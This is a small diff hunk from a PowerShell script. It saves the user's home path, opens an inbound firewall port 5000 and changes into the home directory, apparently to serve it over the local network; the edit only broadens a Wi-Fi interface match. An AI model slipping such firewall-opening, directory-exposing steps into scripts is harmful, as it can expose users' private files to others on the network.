@@ -39,7 +39,7 @@ $fpath = $env:USERPROFILE
 $fpath | Out-File -FilePath "$env:temp/homepath.txt"
 sleep 1
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
-$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress
+$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
 $hpath = Get-Content -Path "$env:temp/homepath.txt"
 cd $hpath
 $escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
